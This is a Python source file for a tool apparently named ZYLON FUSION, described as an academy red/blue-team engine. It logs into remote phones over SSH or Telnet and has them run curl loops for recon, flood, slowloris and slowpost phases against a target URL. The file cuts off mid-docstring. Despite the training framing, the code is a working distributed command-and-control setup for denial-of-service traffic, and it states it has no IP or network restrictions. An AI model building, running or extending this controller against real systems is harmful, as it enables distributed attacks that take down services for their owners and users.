"""
ZYLON FUSION v2.5 - Academy Battle Engine
==========================================

WHAT THIS DOES:
    Controller that connects to YOUR phone farm via Telnet or SSH.
    You add your phones by IP + port + username + password.
    ZYLON sends HTTP test commands to each phone, phones execute them against YOUR target.
    Blue team students watch the target and try to defend.

HOW IT WORKS (step by step):
    1. You add agents: "add" -> enter IP, port, username, password for each phone
    2. ZYLON connects to each phone via Telnet or SSH (auto-detected)
    3. You set target: YOUR DVWA or local server URL
    4. You pick a phase (recon/flood/slowloris/slowpost)
    5. ZYLON sends curl/nc commands to each phone
    6. Each phone runs the commands -> sends HTTP requests to target
    7. ZYLON collects results (HTTP status codes) from each phone
    8. Ctrl+C = EMERGENCY STOP -> ZYLON sends kill signal to all phones

PROTOCOLS SUPPORTED:
    - Telnet (port 23): Old school remote terminal, unencrypted
    - SSH (port 8022): Secure shell, default on Termux (sshd)
    Auto-detects: If port is 8022 or 22 -> uses SSH, otherwise Telnet

FLOW DIAGRAM:
    ZYLON (your phone)
        |
        |-- SSH/Telnet --> Phone 1 (any IP) --curl--> DVWA (your server)
        |-- SSH/Telnet --> Phone 2 (any IP) --curl--> DVWA (your server)
        |-- SSH/Telnet --> Phone 3 (any IP) --curl--> DVWA (your server)
        +-- Ctrl+C --> kills all phones instantly

TERMUX COMPATIBLE: Yes - auto-detects Termux Android and uses compatible commands
PYTHON 3.13+ COMPATIBLE: Yes - uses MiniTelnet (socket-based) instead of removed telnetlib
"""

# ============================================================================
# IMPORTS - What each library does
# ============================================================================

import socket      # Low-level networking - used for timeout/connection errors
import select      # I/O multiplexing - used by MiniTelnet for non-blocking reads
import threading   # Runs multiple tasks at the same time (one thread per phone)
import time        # Sleep/delays and timestamps
import json        # JSON data handling
import random      # Random numbers for cache-busting URL parameters
import subprocess  # Run SSH commands externally (for MiniSSH)
import os          # File/path operations
from datetime import datetime  # Timestamps for battle stats

# Rich library - makes terminal output look pretty with colors, tables, panels
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box

from core.var import USER_AGENTS
from core.shared_infra import shared_session, regex_cache

console = Console()


# ============================================================================
# PORT CHECK UTILITY - Test if a port is open before trying to connect
# ============================================================================
# This is the FIRST thing we do before Telnet/SSH login.
# It tells us if the phone is even reachable on that port.
# If this fails, there's no point trying Telnet/SSH login.

def check_port(host, port, timeout=5):
    """
    Test if a TCP port is open and accepting connections.
    
    WHY WE NEED THIS:
        Before trying Telnet/SSH login, we check if the port is even open.
        This gives us a much faster and clearer error message:
        - "Port closed" = no server running on that port
        - "Port open but login failed" = server is there, wrong credentials
        - "Host unreachable" = IP is wrong or network issue
    
    HOW IT WORKS:
        1. Create a TCP socket
        2. Set a timeout (5 seconds default)
        3. Try to connect to host:port
        4. If connection succeeds -> port is OPEN (something is listening)
        5. If timeout -> port is FILTERED (firewall blocking or host unreachable)
        6. If connection refused -> port is CLOSED (nothing listening there)
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, int(port)))
        sock.close()
        
        if result == 0:
            # Port is OPEN - something is listening there
            return True, "OPEN"
        elif result == 111:
            # Connection refused - port is closed (nothing listening)
            return False, "CLOSED (nothing listening on that port)"
        elif result == 113:
            # No route to host
            return False, "NO ROUTE (host unreachable - wrong IP or network issue)"
        else:
            # Other error
            return False, f"FILTERED (error code: {result})"
    except socket.timeout:
        # Timeout - probably firewall dropping packets
        return False, "TIMEOUT (port filtered or host unreachable)"
    except socket.gaierror:
        # DNS resolution failed (invalid hostname)
        return False, "DNS FAIL (invalid hostname)"
    except Exception as e:
        return False, f"ERROR ({str(e)[:40]})"


# ============================================================================
# MINI TELNET - Custom socket-based Telnet client
# ============================================================================
# WHY THIS EXISTS:
#   Python 3.13 REMOVED the built-in telnetlib module!
#   So we built our own MiniTelnet using raw sockets.
#   Works on Python 3.6+ including 3.12 and 3.13.
#
# HOW TELNET WORKS (simplified):
#   1. Open a TCP connection to the server on port 23
#   2. Server sends a login prompt: "login: "
#   3. Client sends username + newline
#   4. Server sends password prompt: "Password: "
#   5. Client sends password + newline
#   6. Server gives a shell prompt: "$ " or "# "
#   7. Client sends commands, server executes them and returns output
#
# TELNET PROTOCOL DETAILS:
#   - IAC (Interpret As Command): byte 255, starts a Telnet command
#   - WILL/WONT/DO/DONT: Negotiation of Telnet options
#   - We handle basic IAC negotiation to prevent the server from
#     sending us into echo mode or other unwanted states

class MiniTelnet:
    """
    Custom socket-based Telnet client. Replaces Python 3.13's removed telnetlib.
    
    SUPPORTS:
        - read_until(delimiter, timeout) - Read until a string appears
        - write(data) - Send data to the server
        - close() - Close the connection
        - Basic IAC negotiation (prevents server from messing up our terminal)
    
    LIMITATIONS:
        - No advanced Telnet option negotiation (we don't need it)
        - No TLS/SSL support (Telnet is unencrypted anyway)
    
    USAGE:
        tn = MiniTelnet("192.168.1.10", 23, timeout=10)
        tn.read_until(b"login: ", timeout=5)
        tn.write(b"admin\n")
        tn.read_until(b"Password: ", timeout=5)
        tn.write(b"password\n")
        tn.read_until(b"$ ", timeout=5)
        tn.write(b"uname -a\n")
        output = tn.read_until(b"$ ", timeout=5)
        tn.close()
    """
    
    # Telnet protocol bytes (IAC = Interpret As Command)
    IAC  = bytes([255])   # 0xFF - Start of Telnet command
    DONT = bytes([254])   # 0xFE - Don't do this option
    DO   = bytes([253])   # 0xFD - Please do this option
    WONT = bytes([252])   # 0xFC - I won't do this option
    WILL = bytes([251])   # 0xFB - I will do this option
    
    def __init__(self, host, port=23, timeout=10):
        """
        Connect to a Telnet server.
        
        ARGS:
            host: IP address or hostname (e.g., "192.168.1.10")
            port: Telnet port (default 23)
            timeout: Connection timeout in seconds
        
        WHAT HAPPENS:
            1. Create a TCP socket
            2. Connect to host:port
            3. Connection is ready for read_until/write
        """
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(timeout)
        self.sock.connect((host, int(port)))
        self.sock.settimeout(5)  # Set read timeout after connect
        self._buffer = b""  # Buffer for incoming data
    
    def read_until(self, delimiter, timeout=5):
        """
        Read data from the server until we see the delimiter string.
        
        HOW IT WORKS:
            1. Check our buffer first (might already have the delimiter)
            2. If not in buffer, keep reading from socket
            3. Use select() to wait for data with a timeout
            4. When delimiter found, return everything up to and including it
            5. Keep any leftover data in buffer for next read
        
        ARGS:
            delimiter: Bytes to wait for (e.g., b"login: " or b"$ ")
            timeout: Max seconds to wait
        
        RETURNS:
            All data read up to and including the delimiter
        
        EXAMPLE:
            data = tn.read_until(b"login: ", timeout=5)
            # data might be: b"\r\nUbuntu login: "
        """
        # Check if delimiter is already in our buffer from a previous read
        if delimiter in self._buffer:
            idx = self._buffer.index(delimiter) + len(delimiter)
            result = self._buffer[:idx]
            self._buffer = self._buffer[idx:]  # Save leftover data
            return result
        
        # Not in buffer - need to read more data from socket
        end_time = time.time() + timeout
        
        while time.time() < end_time:
            remaining = end_time - time.time()
            if remaining <= 0:
                break
            
            # select() waits until data is available, with a 1-second check interval
            # This prevents busy-waiting (wasting CPU while waiting for data)
            ready, _, _ = select.select([self.sock], [], [], min(1.0, remaining))
            
            if ready:
                try:
                    chunk = self.sock.recv(4096)  # Read up to 4KB at a time
                    if not chunk:
                        # Connection closed by server
                        break
                    
                    # Handle Telnet IAC negotiation commands
                    chunk = self._negotiate(chunk)
                    self._buffer += chunk
                    
                    # Check if delimiter is now in the buffer
                    if delimiter in self._buffer:
                        idx = self._buffer.index(delimiter) + len(delimiter)
                        result = self._buffer[:idx]
                        self._buffer = self._buffer[idx:]
                        return result
                        
                except socket.timeout:
                    continue
                except Exception:
                    break
        
        # Timeout - return whatever we have
        result = self._buffer
        self._buffer = b""
        return result
    
    def write(self, data):
        """
        Send data to the Telnet server.
        
        Simply sends the bytes over the socket.
        Usually you send: command + b"\n" (newline = pressing Enter)
        
        EXAMPLE:
            tn.write(b"admin\n")  # Type "admin" and press Enter
        """
        self.sock.sendall(data)
    
    def close(self):
        """
        Close the Telnet connection.
        Sends a graceful close to the socket.
        """
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass
    
    def _negotiate(self, data):
        """
        Handle Telnet IAC (Interpret As Command) negotiation.
        
        WHY THIS IS NEEDED:
            When you connect to a Telnet server, it sends option negotiation
            commands like "I WILL ECHO" or "I DO SUPPRESS_GO_AHEAD".
            If we don't respond, the server might hang or behave weirdly.
        
        WHAT WE DO:
            - Respond WONT to all WILL requests (we won't do anything)
            - Respond DONT to all DO requests (don't ask us to do anything)
            - This tells the server: "Just give me a plain terminal, no fancy options"
        
        TELNET COMMAND FORMAT:
            IAC (255) + COMMAND (251-254) + OPTION (1 byte)
            Example: 255 251 1 = "I WILL ECHO"
            Our response: 255 252 1 = "I WON'T ECHO"
        """
        result = b""
        i = 0
        while i < len(data):
            if data[i:i+1] == self.IAC:
                if i + 2 < len(data):
                    cmd = data[i+1:i+2]
                    opt = data[i+2:i+3]
                    
                    if cmd == self.WILL:
                        # Server says "I will do X" -> respond "Don't"
                        self.sock.sendall(self.IAC + self.DONT + opt)
                    elif cmd == self.DO:
                        # Server says "Please do X" -> respond "I won't"
                        self.sock.sendall(self.IAC + self.WONT + opt)
                    elif cmd == self.WONT or cmd == self.DONT:
                        # Server says "I won't do X" or "Don't do X" - OK, noted
                        pass
                    
                    i += 3  # Skip IAC + CMD + OPT (3 bytes)
                else:
                    i += 1
            else:
                # Normal data byte - keep it
                result += data[i:i+1]
                i += 1
        
        return result


# ============================================================================
# MINI SSH - Subprocess-based SSH client for Termux
# ============================================================================
# WHY THIS EXISTS:
#   Most Termux phones run `sshd` (SSH server), NOT Telnet server.
#   SSH is the standard way to remotely access Termux phones.
#   Default SSH port on Termux is 8022 (not 22, because port 22 needs root).
#
# HOW IT WORKS:
#   Instead of using a Python SSH library (paramiko - hard to install on Termux),
#   we just call the `sshpass` or `ssh` command directly via subprocess.
#   This is simpler and works on any system that has SSH installed.
#
# REQUIREMENTS ON THE CONTROLLER (your phone running ZYLON):
#   - `sshpass` package (for auto-password login): pkg install sshpass
#   - OR `ssh` with key-based auth (no password needed)
#
# REQUIREMENTS ON THE AGENT PHONES (your phone farm):
#   - `openssh` package installed: pkg install openssh
#   - SSH server running: sshd
#   - Default Termux SSH port: 8022

class MiniSSH:
    """
    SSH client using subprocess (calls sshpass/ssh command).
    
    WHY SUBPROCESS INSTEAD OF PARAMIKO:
        - paramiko is hard to install on Termux (C dependencies fail)
        - sshpass is a simple apt/pkg install
        - subprocess + sshpass works everywhere
    
    USAGE:
        ssh = MiniSSH("192.168.1.10", 8022, "admin", "mypassword")
        ssh.connect()
        output = ssh.execute("uname -a")
        ssh.close()
    """
    
    def __init__(self, host, port=8022, username="admin", password="admin"):
        self.host = host
        self.port = int(port)
        self.username = username
        self.password = password
        self.connected = False
        self._sshpass_available = False  # Will be checked on connect
    
    def connect(self, timeout=10):
        """
        Test SSH connection by running a simple command.
        
        HOW IT WORKS:
            1. Check if `sshpass` is installed (needed for password auth)
            2. Try to run `echo test` on the remote server via SSH
            3. If it works -> connected! 
            4. If not -> return the error
        
        COMMAND USED:
            sshpass -p 'PASSWORD' ssh -p PORT -o StrictHostKeyChecking=no USER@HOST 'echo ZYLON_OK'
        
        FLAGS:
            -o StrictHostKeyChecking=no  = Don't ask to confirm host key
            -o UserKnownHostsFile=/dev/null = Don't save host key
            -o ConnectTimeout=10        = Connection timeout in seconds
        """
        # Check if sshpass is available
        try:
            result = subprocess.run(
                ['which', 'sshpass'], 
                capture_output=True, timeout=3
            )
            self._sshpass_available = (result.returncode == 0)
        except Exception:
            self._sshpass_available = False
        
        if not self._sshpass_available:
            # Try without sshpass (key-based auth)
            return self._connect_key(timeout)
        
        # Use sshpass for password authentication
        return self._connect_sshpass(timeout)
    
    def _connect_sshpass(self, timeout=10):
        """Connect using sshpass (password-based SSH auth)"""
        try:
            cmd = [
                'sshpass', '-p', self.password,
                'ssh',
                '-p', str(self.port),
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                '-o', f'ConnectTimeout={timeout}',
                '-o', 'LogLevel=ERROR',
                f'{self.username}@{self.host}',
                'echo ZYLON_SSH_OK'
            ]
            
            result = subprocess.run(
                cmd, capture_output=True, timeout=timeout + 5,
                text=True
            )
            
            if 'ZYLON_SSH_OK' in result.stdout:
                self.connected = True
                return True, "SSH Connected (sshpass)"
            elif 'Permission denied' in result.stderr:
                return False, "SSH Auth failed (wrong password)"
            elif 'Connection refused' in result.stderr:
                return False, "SSH Connection refused (sshd not running?)"
            elif 'timed out' in result.stderr.lower() or result.returncode == 255:
                return False, "SSH Connection timeout"
            else:
                return False, f"SSH Error: {result.stderr[:60]}"
                
        except subprocess.TimeoutExpired:
            return False, "SSH Connection timeout"
        except FileNotFoundError:
            return False, "sshpass not installed (run: pkg install sshpass)"
        except Exception as e:
            return False, f"SSH Error: {str(e)[:50]}"
    
    def _connect_key(self, timeout=10):
        """Connect using SSH key (no password needed)"""
        try:
            cmd = [
                'ssh',
                '-p', str(self.port),
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                '-o', f'ConnectTimeout={timeout}',
                '-o', 'LogLevel=ERROR',
                '-o', 'BatchMode=yes',  # Don't ask for password
                f'{self.username}@{self.host}',
                'echo ZYLON_SSH_OK'
            ]
            
            result = subprocess.run(
                cmd, capture_output=True, timeout=timeout + 5,
                text=True
            )
            
            if 'ZYLON_SSH_OK' in result.stdout:
                self.connected = True
                return True, "SSH Connected (key auth)"
            elif 'Permission denied' in result.stderr:
                return False, "SSH Auth failed (no key, install sshpass for password auth)"
            elif 'Connection refused' in result.stderr:
                return False, "SSH Connection refused"
            else:
                return False, f"SSH Error: {result.stderr[:60]}"
                
        except subprocess.TimeoutExpired:
            return False, "SSH Connection timeout"
        except Exception as e:
            return False, f"SSH Error: {str(e)[:50]}"
    
    def execute(self, command, timeout=60):
        """
        Run a shell command on the remote server via SSH and get the output.
        
        HOW IT WORKS:
            1. Build an SSH command string
            2. Run it via subprocess
            3. Return the stdout output
        
        EXAMPLE:
            success, output = ssh.execute("curl -s http://target.com")
            # output = "200 200 403 ..."
        """
        if not self.connected:
            return False, "Not connected"
        
        try:
            if self._sshpass_available:
                cmd = [
                    'sshpass', '-p', self.password,
                    'ssh',
                    '-p', str(self.port),
                    '-o', 'StrictHostKeyChecking=no',
                    '-o', 'UserKnownHostsFile=/dev/null',
                    '-o', 'LogLevel=ERROR',
                    f'{self.username}@{self.host}',
                    command
                ]
            else:
                cmd = [
                    'ssh',
                    '-p', str(self.port),
                    '-o', 'StrictHostKeyChecking=no',
                    '-o', 'UserKnownHostsFile=/dev/null',
                    '-o', 'LogLevel=ERROR',
                    '-o', 'BatchMode=yes',
                    f'{self.username}@{self.host}',
                    command
                ]
            
            result = subprocess.run(
                cmd, capture_output=True, timeout=timeout,
                text=True
            )
            
            return True, result.stdout
            
        except subprocess.TimeoutExpired:
            return False, "Command timeout"
        except Exception as e:
            return False, f"Exec error: {str(e)[:40]}"
    
    def send_stop(self):
        """
        EMERGENCY STOP - Kill processes on the remote server.
        
        Runs pkill to kill any curl/wget processes that ZYLON started.
        This is different from Telnet's Ctrl+C approach.
        With SSH, we send a kill command instead of an interrupt signal.
        """
        if not self.connected:
            return
        try:
            self.execute(
                "pkill -f 'curl.*zylon' 2>/dev/null; "
                "pkill -f 'curl.*ZYLONAcademy' 2>/dev/null; "
                "pkill -f 'wget.*zylon' 2>/dev/null; "
                "pkill -f 'nc.*zylon' 2>/dev/null",
                timeout=10
            )
        except Exception:
            pass
    
    def close(self):
        """
        Close SSH connection.
        With subprocess SSH, each command is a separate connection,
        so there's no persistent connection to close.
        Just mark as disconnected.
        """
        self.send_stop()
        self.connected = False


# ============================================================================
# AGENT CLASS - Represents ONE phone in your farm
# ============================================================================
# 
# Each phone in your farm is represented by a TelnetAgent object.
# When you "add" a phone, ZYLON creates a TelnetAgent for it.
# When you "connect", it logs into the phone via Telnet or SSH.
# When you run a phase, it sends commands to the phone.
#
# AUTO-DETECT PROTOCOL:
#   - Port 22 or 8022 -> SSH (MiniSSH)
#   - Any other port (23, etc.) -> Telnet (MiniTelnet)
#   This is because Termux SSH runs on 8022 by default.

class TelnetAgent:
    """
    Represents a single phone agent connected via Telnet or SSH.
    
    Each agent stores:
        - host: Phone's IP address (e.g., 192.168.1.10 or any public IP)
        - port: Connection port (8022 for SSH, 23 for Telnet)
        - username: Login username (e.g., "admin")
        - password: Login password
        - protocol: "ssh" or "telnet" (auto-detected from port number)
        - connected: Whether we're currently logged in
        - os_type: "termux" (Android) or "linux" (determines which commands to use)
    """
    
    def __init__(self, host, port, username, password, agent_id=0):
        # Connection details - you provide these when adding an agent
        self.host = host              # Phone's IP (any network - local or public)
        self.port = int(port)         # Connection port
        self.username = username      # Login username
        self.password = password      # Login password
        self.agent_id = agent_id      # Auto-assigned number (1, 2, 3...)
        
        # Auto-detect protocol from port number
        # Port 22 = standard SSH, Port 8022 = Termux SSH
        # Any other port = assume Telnet
        if self.port in [22, 8022]:
            self.protocol = "ssh"
        else:
            self.protocol = "telnet"
        
        # State tracking
        self.connected = False        # Are we currently logged into this phone?
        self.conn = None              # The connection object (MiniTelnet or MiniSSH)
        self.os_type = None          # 'termux' or 'linux' - auto-detected after login
        self.busy = False            # Is this phone currently running commands?
        self.requests_sent = 0       # How many requests this phone has sent
        self.last_status = "Disconnected"  # Current status for display
    
    def connect(self, timeout=10):
        """
        Connect to this phone and log in.
        
        STEP BY STEP:
            1. First check if the port is even open (quick diagnostic)
            2. Based on protocol (SSH or Telnet), use the right client
            3. SSH: Use MiniSSH (subprocess + sshpass)
            4. Telnet: Use MiniTelnet (socket-based)
            5. Auto-detect OS type (Termux/Android vs Linux)
            6. Return success or a helpful error message
        
        PORT CHECK:
            We check the port FIRST before trying to log in.
            If the port is closed, there's no point trying credentials.
            This gives you a clear error: "Port closed" vs "Auth failed"
        """
        # Step 0: Quick port check - is anything even listening?
        port_open, port_msg = check_port(self.host, self.port, timeout=5)
        if not port_open:
            self.last_status = f"Port {port_msg}"
            return False, f"Port {self.port} is {port_msg}"
        
        # Step 1: Connect using the right protocol
        if self.protocol == "ssh":
            return self._connect_ssh(timeout)
        else:
            return self._connect_telnet(timeout)
    
    def _connect_ssh(self, timeout=10):
        """
        Connect via SSH using MiniSSH.
        
        MiniSSH uses subprocess to call sshpass/ssh command.
        No telnetlib dependency needed.
        """
        try:
            self.conn = MiniSSH(self.host, self.port, self.username, self.password)
            success, msg = self.conn.connect(timeout=timeout)
            
            if success:
                self.connected = True
                self.last_status = "Connected (SSH)"
                
                # Auto-detect OS type
                ok, output = self.conn.execute("uname -a 2>/dev/null || echo TERMUX_ANDROID", timeout=10)
                if ok:
                    if "android" in output.lower() or "TERMUX" in output:
                        self.os_type = "termux"
                    else:
                        self.os_type = "linux"
                else:
                    self.os_type = "linux"  # Default assumption
                
                return True, msg
            else:
                self.last_status = f"SSH {msg}"
                return False, msg
                
        except Exception as e:
            self.last_status = f"Error: {str(e)[:30]}"
            return False, str(e)[:50]
    
    def _connect_telnet(self, timeout=10):
        """
        Connect via Telnet using MiniTelnet (socket-based).
        
        This is exactly what happens when YOU open a terminal and type:
            $ telnet 192.168.1.10
            login: admin
            Password: ****
            $ _
        
        STEP BY STEP:
            1. Create MiniTelnet connection to host:port
            2. Wait for "login: " prompt
            3. Type the username + Enter
            4. Wait for "Password: " prompt
            5. Type the password + Enter
            6. Wait for shell prompt ($ or #)
            7. If we get a shell -> connected! Auto-detect OS type.
            8. If timeout or auth fails -> mark as failed
        """
        try:
            # Step 1: Open Telnet connection
            self.conn = MiniTelnet(self.host, self.port, timeout=timeout)
            
            # Step 2: Wait for login prompt (most Telnet servers show "login: ")
            # Some servers might show "Login:" or "login:" - case insensitive
            initial = self.conn.read_until(b"login: ", timeout=5)
            
            # If we didn't get "login:", try "Login:" or just proceed
            if b"login:" not in initial.lower() and b"$ " not in initial and b"# " not in initial:
                # Maybe auto-login or different prompt, try reading a bit more
                extra = self.conn.read_until(b": ", timeout=3)
                initial += extra
            
            # If already at a shell prompt (no login needed)
            if b"$ " in initial or b"# " in initial:
                self.connected = True
                self.last_status = "Connected (Telnet, auto-login)"
                self._detect_os()
                return True, "Connected (auto-login)"
            
            # Step 3: Send username
            self.conn.write(self.username.encode() + b"\n")
            
            # Step 4: Wait for password prompt
            self.conn.read_until(b"assword: ", timeout=5)
            
            # Step 5: Send password
            self.conn.write(self.password.encode() + b"\n")
            
            # Step 6: Wait for shell prompt ($ for normal user, # for root)
            response = self.conn.read_until(b"$ ", timeout=8)
            
            # Check for common failure indicators
            combined = initial + response
            if b"Login incorrect" in combined or b"Authentication failure" in combined:
                self.last_status = "Auth failed"
                self.conn.close()
                return False, "Authentication failed (wrong username/password)"
            
            if b"$ " in response or b"# " in response:
                # Login successful!
                self.connected = True
                self.last_status = "Connected (Telnet)"
                self._detect_os()
                return True, "Connected"
            else:
                # Try waiting a bit more for the prompt
                extra = self.conn.read_until(b"$ ", timeout=3)
                if b"$ " in extra or b"# " in extra:
                    self.connected = True
                    self.last_status = "Connected (Telnet)"
                    self._detect_os()
                    return True, "Connected"
                else:
                    # Login failed - wrong username/password or no shell
                    self.last_status = "Auth failed"
                    self.conn.close()
                    return False, "Authentication failed (no shell prompt received)"
                
        except socket.timeout:
            self.last_status = "Timeout"
            return False, "Connection timeout"
        except ConnectionRefusedError:
            self.last_status = "Refused"
            return False, "Connection refused (no Telnet server on this port)"
        except Exception as e:
            self.last_status = f"Error: {str(e)[:30]}"
            return False, str(e)[:50]
    
    def _detect_os(self):
        """Auto-detect if the phone is running Termux or standard Linux"""
        try:
            if self.protocol == "ssh":
                ok, output = self.conn.execute("uname -a 2>/dev/null || echo TERMUX_ANDROID", timeout=5)
                if ok and ("android" in output.lower() or "TERMUX" in output):
                    self.os_type = "termux"
                else:
                    self.os_type = "linux"
            else:
                # Telnet
                self.conn.write(b"uname -a 2>/dev/null || echo TERMUX_ANDROID\n")
                resp = self.conn.read_until(b"$ ", timeout=5).decode('utf-8', errors='ignore')
                if "TERMUX" in resp or "android" in resp.lower():
                    self.os_type = "termux"
                else:
                    self.os_type = "linux"
        except Exception:
            self.os_type = "linux"  # Default assumption
    
    def execute(self, command, timeout=60):
        """
        Run a shell command on this phone and get the output.
        
        HOW IT WORKS:
            - SSH: Each command is a separate SSH session (subprocess)
            - Telnet: Send command over the persistent connection
        
        Returns: (success_bool, output_string)
        """
        if not self.connected or not self.conn:
            return False, "Not connected"
        
        try:
            if self.protocol == "ssh":
                # SSH: Each command is a new subprocess call
                return self.conn.execute(command, timeout=timeout)
            else:
                # Telnet: Send over persistent connection
                self.conn.write(command.encode() + b"\n")
                # Read until shell prompt appears (means command finished)
                response = self.conn.read_until(b"$ ", timeout=timeout)
                return True, response.decode('utf-8', errors='ignore')
        except Exception as e:
            self.last_status = f"Exec error: {str(e)[:20]}"
            return False, str(e)[:50]
    
    def send_stop(self):
        """
        EMERGENCY STOP - Kill whatever this phone is doing.
        
        HOW IT WORKS:
            SSH: Send pkill command to kill leftover processes
            Telnet: Send Ctrl+C (\x03) + pkill command
        """
        if not self.connected or not self.conn:
            return
        try:
            if self.protocol == "ssh":
                self.conn.send_stop()
            else:
                # Telnet: Send Ctrl+C signal twice
                self.conn.write(b"\x03")     # \x03 = Ctrl+C
                time.sleep(0.2)
                self.conn.write(b"\x03")     # Double tap
                time.sleep(0.2)
                # Kill any remaining processes
                self.conn.write(b"pkill -f 'curl.*zylon' 2>/dev/null; pkill -f 'curl.*ZYLONAcademy' 2>/dev/null; pkill -f 'wget.*zylon' 2>/dev/null\n")
                time.sleep(0.3)
            
            self.busy = False
            self.last_status = "Stopped"
        except Exception:
            pass
    
    def disconnect(self):
        """
        Gracefully disconnect from this phone.
        Sends stop signal first, then logs out and closes connection.
        """
        self.send_stop()
        try:
            if self.conn:
                if self.protocol == "ssh":
                    self.conn.close()
                else:
                    self.conn.write(b"exit\n")
                    self.conn.close()
        except Exception:
            pass
        self.connected = False
        self.last_status = "Disconnected"


# ============================================================================
# BATTLE ENGINE - The main controller
# ============================================================================
# 
# This is the brain of Battle Mode. It:
#   - Manages all your phone agents (add, connect, disconnect)
#   - Builds the commands that get sent to each phone
#   - Runs the 4 battle phases (recon, flood, slowloris, slowpost)
#   - Tracks statistics (requests sent, blocked, etc.)
#   - Has emergency stop functionality
#   - Supports BOTH SSH and Telnet protocols

class BattleEngine:
    """
    Academy Battle Engine - Red Team vs Blue Team Controller.
    
    ARCHITECTURE:
        ZYLON (controller) --SSH/Telnet--> Phone 1 --curl--> Target
                                |--SSH/Telnet--> Phone 2 --curl--> Target
                                +--SSH/Telnet--> Phone 3 --curl--> Target
    
    The controller never sends traffic directly to the target.
    It only tells the phones WHAT to do, and they do it.
    This is the same pattern as a real C2 (Command & Control) system.
    
    PROTOCOLS:
        - SSH (port 22/8022): Secure, default on Termux
        - Telnet (port 23): Unencrypted, for older setups
        Auto-detected from port number when you add an agent.
    
    NETWORK:
        Works on ANY network - local WiFi, cellular data, VPN, etc.
        No IP restrictions. You control which phones you add.
    """
    
    def __init__(self):
        self.agents = []           # List of TelnetAgent objects (your phones)
        self.target = None         # Target URL (your DVWA or local server)
        self.running = False       # Is a battle phase currently running?
        
        # _stop_flag is used for thread-safe stopping
        # When set, all agent threads check this and stop
        self._stop_flag = threading.Event()
        
        # Battle statistics - tracked across all phases
        self.stats = {
            'total_requests': 0,   # Total HTTP requests sent by all phones
            'successful': 0,       # Requests that got 200-399 response
            'blocked': 0,          # Requests that got 429/503/403 (defended!)
            'errors': 0,           # Connection errors, timeouts, etc.
            'start_time': None,    # When the battle started
            'agents_active': 0,    # How many phones are connected
            'phases_run': 0        # How many phases have been run
        }
    
    def add_agent(self, host, port, username, password):
        """
        Add a phone to the farm.
        
        NO IP RESTRICTIONS:
            Works on ANY network - local WiFi, cellular data, VPN.
            Your phones may be on different networks, that's fine.
            You are responsible for adding the right phones.
        
        AUTO-DETECT PROTOCOL:
            Port 22 or 8022 -> SSH (MiniSSH)
            Any other port -> Telnet (MiniTelnet)
        """
        agent_id = len(self.agents) + 1  # Auto-number: 1, 2, 3...
        agent = TelnetAgent(host, port, username, password, agent_id)
        self.agents.append(agent)
        proto_label = "SSH" if agent.protocol == "ssh" else "Telnet"
        return True, f"Agent {agent_id} added ({host}:{port} [{proto_label}])"
    
    def connect_all(self):
        """
        Connect to ALL registered agents at once.
        
        For each agent:
            1. First check if port is open (quick diagnostic)
            2. Try to connect via SSH or Telnet
            3. Return results showing which phones connected and which failed
        
        Returns: (any_connected_bool, list_of_results)
        """
        if not self.agents:
            return False, "No agents registered"
        
        results = []
        connected = 0
        
        for agent in self.agents:
            success, msg = agent.connect(timeout=10)
            results.append((agent.agent_id, agent.host, agent.protocol, success, msg))
            if success:
                connected += 1
        
        self.stats['agents_active'] = connected
        return connected > 0, results
    
    def disconnect_all(self):
        """
        EMERGENCY DISCONNECT - Stop all agents and close all connections.
        Called when you press Ctrl+C or type 'stop'.
        """
        self._stop_flag.set()   # Signal all threads to stop
        self.running = False
        for agent in self.agents:
            agent.send_stop()     # Send Ctrl+C/pkill to each phone
            agent.disconnect()    # Close connection
    
    # ========================================================================
    # COMMAND BUILDERS
    # ========================================================================
    # These methods build shell commands that get sent to each phone.
    # The phone's shell executes them (like typing in terminal).
    # We use curl for HTTP requests and nc (netcat) for raw TCP.
    
    def _build_curl_command(self, target_url, method="GET", path="/", 
                             threads=1, count=10, delay=0.1):
        """
        Build a curl-based test command.
        
        WHAT THIS GENERATES (example for 5 requests):
            for i in $(seq 1 5); do
                curl -s -o /dev/null -w '%{http_code}'
                    -X GET
                    -H 'User-Agent: {random.choice(USER_AGENTS)}'
                    'http://192.168.1.100/?zylon=$RANDOM'
                    2>/dev/null && echo '';
                sleep 0.1;
            done
        
        BREAKDOWN:
            - for i in $(seq 1 N)    -> Loop N times
            - curl -s                -> Silent mode (no progress bar)
            - -o /dev/null           -> Don't save response body
            - -w '%{http_code}'      -> Only print HTTP status code (200, 403, etc.)
            - -X GET                 -> HTTP method
            - ?zylon=$RANDOM         -> Random URL parameter (bypasses caching)
            - 2>/dev/null            -> Hide error messages
            - sleep 0.1              -> Small delay between requests
        
        $RANDOM is a bash variable that generates a random number each time.
        This makes every request unique so the server can't cache it.
        """
        if self.agents and self.agents[0].os_type == "termux":
            # Termux Android - slightly different curl syntax
            cmd = (
                f"for i in $(seq 1 {count}); do "
                f"curl -s -o /dev/null -w '%{{http_code}}' "
                f"-X {method} "
                f"-H 'User-Agent: {random.choice(USER_AGENTS)}' "
                f"-H 'X-Test-Request: $i' "
                f"'{target_url}{path}?zylon=$RANDOM' "
                f"2>/dev/null && echo ''; "
                f"sleep {delay}; "
                f"done"
            )
        else:
            # Standard Linux
            cmd = (
                f"for i in $(seq 1 {count}); do "
                f"curl -s -o /dev/null -w '%{{http_code}}\\n' "
                f"-X {method} "
                f"-H 'User-Agent: {random.choice(USER_AGENTS)}' "
                f"-H 'X-Test-Request: $i' "
                f"'{target_url}{path}?zylon=$RANDOM' "
                f"2>/dev/null; "
                f"sleep {delay}; "
                f"done"
            )
        return cmd
    
    def _build_flood_command(self, target_url, count=50, path="/"):
        """
        Build a rapid-fire flood command.
        
        DIFFERENCE FROM NORMAL CURL:
            - No sleep between requests (maximum speed)
            - --max-time 5 (timeout each request after 5 seconds)
            - Status codes printed on same line (faster parsing)
            - Same ?q=$RANDOM cache-busting technique as the Go script
        
